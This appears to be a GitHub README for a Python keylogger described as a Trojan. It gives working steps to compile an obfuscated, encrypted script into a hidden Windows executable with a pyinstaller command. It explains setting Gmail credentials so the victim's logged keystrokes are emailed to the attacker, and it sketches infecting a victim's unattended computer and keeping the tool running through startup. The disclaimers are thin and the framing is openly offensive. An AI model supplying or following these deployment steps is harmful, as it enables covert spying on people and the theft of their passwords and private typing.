# Pylogger project

This project is a Python implementation of a Keylogger that will give you the ability to read keystrokes from a target machine.

## Disclaimer

The use of this project is at **your own responsability and risk**. We do not accept illegal activities and you must be cautious about what you do with this program. Always ensure that you have the 
**appropiate permissions** to run this project in a target machine that you do not own.

---

## Getting started as a bad hacker! (It's bait of course)

First, clone the repository on your own machine using the next command:

```bash git clone https://github.com/AzJRC/pylogger.git ```

This project aims to have the necessary equipment to perform a real keylogger attack into a target machine using different methods. **Before continuing, read the disclaimer and understand the 
implications of using this program. You are responsible of your own actions.** Then, read the code and understand how it works.
As you may notice, both programs are the same just for one minnor difference: *bexe.pyw is not obfuscated, while aexe.pyw is*. Besides that, there are other things that may captured your attention:

1. Both Python scripts ends with `.pyw` instead of `.py`. This is important because in Windows Operating Systems we want to hide our program from our victim. The `.pyw` extension is compiled in a way 
that avoids showing up any GUI. 
2. Both scripts are the same, but it doesn't look like that... `bexe.pyw` is not encoded while `aexe.pyw` is. Try to read a little bit about the `cryptography.Fernet` 
module in order to understand what is happening there. Take a look to the [Fernet](https://cryptography.io/en/latest/fernet/) documentation, but in simpler words, it just encrypts the program so anyone 
(human or computer) can read it without the secret key!
3. If you read the requirements, the module `pyinstaller` is included. Now you know what you have to do!

Run the following command to compile `aexe.pyw` into an executable:

```
pyinstaller --hidden-import=cryptography --hidden-import=pynput --hidden-import=ssl --hidden-import=smtplib aexe.pyw
```

If for any reason you find some errors or problems running the command or the executable does not appear to work (remember it won't show up any GUI or CLI, but it will appear in the task manager), try to 
use the `--paths=Path/To/Your/Virtual/Environment` to ensure that Pyinstaller is detecting the modules. Also, if you want the program to be only one file without lots of folders, try the `--onefile` 
flag.

### Modifying the keylogger

The previos section tought you how to download and compile the keylogger, and it will work. You may notice that after 50 keystrokes it creates a `log.txt` file with all the keys that you pressed before. But this will be in your victim's machine, not in yours. How can you then get access to the `log.txt` file or at least know what the victim typed? (I mean, that's the purpose of this Trojan...). The program has two more modules included that permits Python to send emails to Google Accounts. Look in the `bexe.pyw` the following lines:

```
sender_email = "youremail@gmail.com"
receiver_email = "youremail@gmail.com"
password = "your google apps password"
```

You may change those lines with your own credentials. *TIP: Do not pass your personal Google Account Credentials there because, even if the code is encrypted, there are lots of intelligent people out 
there with amazing skills to reverse engineer a program. However, if you are just testing and being curious, you can do it in your own system. Better if you do it in Virtual Machines!*
Now that you have everything setup, compile the program again and check if you received the email in your Google Account!

*Note: The password is not your actual password. You must go to your Google Account > Security > Apps passwords and generate a token there. That token will work like your password, so be careful with that.*

Now you have everything to prank your friends and do your own "responsible" things... Just remember that if someone catches you, you are... well, you know.

## Attempting a keylogger attack!

The following section describes an scenario of how would you attempt to install this malicious software in your victim's machine. Follow the story and understand the steps. Also, you may learn something 
and how to protect yourself against someone that is indeed trying to harm you!

### Infecting the target machine

To use this program in a target machine, you would like to install this keylogger in their system. **We encourage you to try this in a virtual machine first before attempting to do it in a real device.** 
How would you infect a machine with this program?

Section comming soon... for now, imagine you got some time alone with your victim's computer while he/she went to the bathroom. You just need a few minutes to do your things...

<details> <summary> SPOILER </summary>
   A pico-ducky! comming soon
</details>

### (For Window) Running the program on startup

In order to ensure that the keylogger will stay in the target machine without generating any signal, we can compile our python program to an executable (`.exe`) file and then run it as a service in the 
background.

 (TODO)

### (For linux) A background daemon

(Commin soon)
